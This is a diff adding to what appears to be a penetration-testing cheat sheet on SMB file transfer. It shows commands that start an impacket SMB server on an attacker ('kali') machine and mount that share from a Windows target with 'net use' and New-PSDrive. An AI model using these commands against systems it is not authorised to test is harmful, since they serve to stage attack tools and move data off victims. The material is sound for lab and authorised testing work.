@@ -369,6 +369,22 @@ $cred = New-Object System.Management.Automation.PSCredential('<user>', $pass)
 New-PSDrive -Name "<ShareName>" -PSProvider "FileSystem" -Root "\\<attackerIP>\<ShareName> -Credential $cred
 ```
 
+**Alternatively**, we can just do this:
+
+```text
+# use double-quotes if file path has spaces in it 
+sudo impacket-smbserver abcd /path/to/serve
+
+# Mount drives with cmd.exe
+net use abcd: \\kali_ip\myshare
+net use abcd: /d # disconnect
+net use abcd: /delete # then delete
+
+# Mount drives with PowerShell
+New-PSDrive -Name "abcd" -PSProvider "FileSystem" -Root "\\ip\abcd"
+Remove-PSDrive -Name abcd
+```
+
 **Alternatively**, if we which to just copy the file instead of mounting PSDrive we can use copy or xcopy commands as follows:
 
 ```text
